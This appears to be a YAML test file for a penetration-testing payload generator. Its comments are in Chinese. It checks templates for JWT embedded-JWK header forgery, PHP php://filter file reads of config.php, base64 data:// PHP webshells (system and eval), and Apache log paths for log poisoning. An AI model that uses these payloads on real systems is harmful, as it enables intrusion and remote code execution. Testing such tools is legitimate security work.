  # ================= jwt.generic.jwk.header · jwk =================
  # 这两个选项的字段值是**一整段嵌了变量的 JSON**（`"kid":"<<kid>>"`），
  # 所以它同时钉住两件事：字段值原样代入 jwk.key、内层 `<<kid>>` 在下一阶段才求值。

  - name: jwt.generic.jwk.header · jwk=rsa
    state:
      vuln: jwt
      template: jwt.generic.jwk.header
      slots: {jwk: rsa}
      vars:
        kid: attacker
        modulus: sXchG1aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789
        secret: supersecret
      outputs: [raw]
    expect:
      # alg 走槽位字段 RS256；内层 kid/n 与外层 kid 同值（都来自 <<kid>>）
      payload: '{"alg":"RS256","typ":"JWT","kid":"attacker","jwk":{"kty":"RSA","use":"sig","alg":"RS256","kid":"attacker","n":"sXchG1aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789","e":"AQAB"}}'
      syntax: ok

  - name: jwt.generic.jwk.header · jwk=oct
    state:
      vuln: jwt
      template: jwt.generic.jwk.header
      slots: {jwk: oct}
      vars:
        kid: attacker
        modulus: sXchG1aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789
        secret: supersecret
      outputs: [raw]
    expect:
      # 对称密钥档：alg 变 HS256，密钥体只有 k，且**不带** n/e
      payload: '{"alg":"HS256","typ":"JWT","kid":"attacker","jwk":{"kty":"oct","alg":"HS256","k":"supersecret"}}'
      syntax: ok

  # ================= lfi.generic.filter.iconv · enc =================

  - name: lfi.generic.filter.iconv · enc=utf16
    state:
      vuln: lfi
      component: php
      template: lfi.generic.filter.iconv
      slots: {enc: utf16}
      vars: {file: /var/www/html/config.php}
      outputs: [raw]
    expect:
      payload: "php://filter/convert.iconv.utf-8.utf-16/resource=/var/www/html/config.php"

  - name: lfi.generic.filter.iconv · enc=utf7
    state:
      vuln: lfi
      component: php
      template: lfi.generic.filter.iconv
      slots: {enc: utf7}
      vars: {file: /var/www/html/config.php}
      outputs: [raw]
    expect:
      payload: "php://filter/convert.iconv.utf-8.utf-7/resource=/var/www/html/config.php"

  - name: lfi.generic.filter.iconv · enc=utf32
    state:
      vuln: lfi
      component: php
      template: lfi.generic.filter.iconv
      slots: {enc: utf32}
      vars: {file: /var/www/html/config.php}
      outputs: [raw]
    expect:
      # 链名是 utf-8.utf-32（带横杠）；少一个横杠 PHP 会直接说 filter 不存在
      payload: "php://filter/convert.iconv.utf-8.utf-32/resource=/var/www/html/config.php"

  # ================= lfi.generic.data.base64 · code =================
  # 三个字段是**手算好的** base64，独立解码核对过：
  #   sys_get   → <?php system($_GET['c']); ?>   （键带引号，见模板里的注释）
  #   eval_post → <?php @eval($_POST[1]);?>
  #   phpinfo   → <?php phpinfo(); ?>

  - name: lfi.generic.data.base64 · code=sys_get
    state:
      vuln: lfi
      component: php
      template: lfi.generic.data.base64
      slots: {code: sys_get}
      outputs: [raw]
    expect:
      payload: "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg=="

  - name: lfi.generic.data.base64 · code=eval_post
    state:
      vuln: lfi
      component: php
      template: lfi.generic.data.base64
      slots: {code: eval_post}
      outputs: [raw]
    expect:
      # 这条的 base64 末尾是 `Pg==`（解码成 `?>`），和 phpinfo 那条的 `Pg==` 不是同一串
      payload: "data://text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg=="

  - name: lfi.generic.data.base64 · code=phpinfo
    state:
      vuln: lfi
      component: php
      template: lfi.generic.data.base64
      slots: {code: phpinfo}
      outputs: [raw]
    expect:
      payload: "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="

  # ================= lfi.generic.log.apache · log =================
  # 三个选项是三种发行版的默认日志路径，路径里 `access.log` 与 `access_log` 不能混。

  - name: lfi.generic.log.apache · log=debian
    state:
      vuln: lfi
      template: lfi.generic.log.apache
      slots: {log: debian}
      outputs: [raw]
    expect:
      payload: "/var/log/apache2/access.log"

  - name: lfi.generic.log.apache · log=rhel
    state:
      vuln: lfi
      template: lfi.generic.log.apache
      slots: {log: rhel}
      outputs: [raw]
    expect:
      # RHEL 系是 httpd 目录 + **下划线** access_log
      payload: "/var/log/httpd/access_log"

  - name: lfi.generic.log.apache · log=custom
    state:
      vuln: lfi
      template: lfi.generic.log.apache
      slots: {log: custom}
      outputs: [raw]
    expect:
      payload: "/usr/local/apache/logs/access_log"

